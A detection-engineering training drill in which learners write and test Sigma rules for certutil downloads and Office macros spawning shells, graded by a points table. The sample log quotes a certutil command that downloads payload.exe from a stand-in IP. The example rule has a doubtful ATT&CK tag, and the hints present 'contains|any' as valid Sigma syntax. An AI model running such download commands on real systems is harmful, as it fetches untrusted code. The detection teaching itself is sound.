# Drill: Write a Sigma Detection Rule

**Level:** Intermediate

**Estimated time:** 60–75 minutes

**Session:** 13 — Advanced Topics in Security Operations

---

## Scenario

You are a detection engineer at **Arcturus Healthcare**.
The company recently suffered a breach where attackers used Living-off-the-Land (LotL) techniques on Windows endpoints — specifically abusing `certutil.exe` to download payloads and `wscript.exe` to execute obfuscated VBScript droppers.

The CISO has asked your team to write Sigma detection rules to catch this behaviour in future incidents.
The rules will be deployed to the company's SIEM (a Sigma-compatible platform).

You have been given sample log data (Windows Event Logs and Sysmon events in JSON format) and must write Sigma rules, validate them, and test them against the log data.

---

## Learning Objectives

* Understand the Sigma rule format and required fields
* Write detection logic for process creation events (Event ID 1 / Windows Event ID 4688)
* Use condition logic (`any of`, `all of`, `not`) appropriately
* Test rules against sample log data using `sigma-cli` or `sigmac`

---

## Environment Setup

```console
cd demos/demo-02-threat-intelligence
docker compose up -d
docker compose exec app bash

# Verify sigma tools are available
sigma --version 2>/dev/null || pip install sigma-cli
```

If `sigma-cli` is not pre-installed, use the manual approach in Task 4.

Sample log data is available at `/data/windows_events.json`.

---

## Background: Sigma Rule Format

A minimal Sigma rule looks like this:

```yaml
title: Suspicious CertUtil Download Activity
id: <generate a UUID>
status: experimental
description: Detects certutil used to download files from remote URLs
references:
  - https://attack.mitre.org/techniques/T1105/
author: Your Name
date: 2024/11/15
tags:
  - attack.defense_evasion
  - attack.t1218.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-decode'
      - '-encode'
  condition: selection
falsepositives:
  - Legitimate certificate operations
level: high
```

---

## Log Format

Each entry in `/data/windows_events.json` uses this Sysmon-style structure:

```json
{
  "EventID": 1,
  "TimeCreated": "2024-11-15T04:12:33Z",
  "Hostname": "WS-ARCTURUS-042",
  "User": "ARCTURUS\\jsmith",
  "Image": "C:\\Windows\\System32\\certutil.exe",
  "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.9/payload.exe C:\\Temp\\svc.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "ParentCommandLine": "cmd.exe /c certutil.exe -urlcache...",
  "ProcessId": 4892,
  "ParentProcessId": 3210
}
```

---

## Tasks

### Task 1 — Analyse the Log Data

1. Load `/data/windows_events.json`.
1. List all unique `Image` (process) values seen in the logs.
1. Find all events where `Image` ends with `certutil.exe` — print their `CommandLine` values.
1. Find all events where `Image` ends with `wscript.exe` — print their `CommandLine` values.
1. Find any suspicious `ParentImage` → `Image` chains (e.g., `word.exe` spawning `cmd.exe`).

**Hint:** Look for Office applications (`WINWORD.EXE`, `EXCEL.EXE`) as parent processes — this is a common macro-based initial access pattern.

### Task 2 — Write Rule 1: CertUtil Download

Write a Sigma rule (`/tmp/rule_certutil_download.yml`) that detects `certutil.exe` being used with download-related flags.

Requirements:

* `logsource.category: process_creation`
* Detect any of these command-line patterns: `-urlcache`, `http://`, `https://`
* Level: `high`
* Include at least 2 ATT&CK tags

**Hint:** Use `CommandLine|contains|any:` for matching multiple strings with OR logic.

### Task 3 — Write Rule 2: Office Macro Spawning Shell

Write a Sigma rule (`/tmp/rule_office_macro_shell.yml`) that detects Office applications spawning command interpreters.

Requirements:

* Detect `Image` ending in `cmd.exe`, `powershell.exe`, or `wscript.exe`
* Parent process must be an Office application (`WINWORD.EXE`, `EXCEL.EXE`, `POWERPNT.EXE`, `OUTLOOK.EXE`)
* Level: `critical`
* Include ATT&CK tag for T1566.001 (Spearphishing Attachment)

**Hint:** Use `ParentImage|endswith|any:` with a list of Office process names.

### Task 4 — Test Your Rules Against the Log Data

Write a Python script that:

1. Loads both rules from `/tmp/*.yml`
1. Loads `/data/windows_events.json`
1. For each log entry, evaluates whether it matches each rule's `detection` block

1. Prints matched events with: `hostname | user | image | commandline | matched_rule`

You do not need a full Sigma evaluation engine.
Implement simplified matching:

* `field|endswith: value` → `record[field].endswith(value)`
* `field|contains: value` → `value in record[field]`
* `field|contains|any: [v1, v2]` → `any(v in record[field] for v in [v1, v2])`

**Hint:** Parse the YAML rules with `yaml.safe_load()`.
The `detection.selection` is a dict of field conditions.
All conditions in `selection` must match (AND logic).

### Task 5 — Tune the Rules

After running Task 4, you will likely see false positives from legitimate IT processes (e.g., a software deployment tool using `certutil` to verify certificate chains).

1. Add a `filter` block to your certutil rule to exclude a known legitimate process path.
1. Update the condition to: `selection and not filter`
1. Re-run your test and confirm the false positive is excluded.
1. Write a brief comment in the rule explaining what the filter excludes and why.

---

## Deliverables

* `/tmp/rule_certutil_download.yml` — CertUtil detection rule
* `/tmp/rule_office_macro_shell.yml` — Office macro shell spawn rule
* `/tmp/rule_tester.py` — Python testing script
* Terminal output showing rule matches

---

## Hints

* Sigma field names for process creation use: `Image`, `CommandLine`, `ParentImage`, `ParentCommandLine`

* `|endswith` modifier is case-insensitive in most Sigma backends — but in Python testing, use `.lower().endswith()`
* `CommandLine|contains|any:` is equivalent to multiple `CommandLine|contains:` items under a list — both are valid Sigma syntax

* A well-tuned detection rule has a low false-positive rate. Consider what legitimate software commonly runs `certutil.exe`
* Sigma rule `id` fields should be UUIDs — use `import uuid; str(uuid.uuid4())`

---

## Evaluation Criteria

| Criterion | Points |
|-----------|--------|
| Task 1: Correctly identified all suspicious processes and parent chains | 20 |
| Task 2: Valid Sigma rule with correct syntax and logic for certutil | 20 |
| Task 3: Valid Sigma rule with correct logic for macro spawn | 20 |
| Task 4: Python tester correctly matches at least 3 events per rule | 25 |
| Task 5: False positive correctly filtered with documented reason | 15 |

**Total: 100 points**
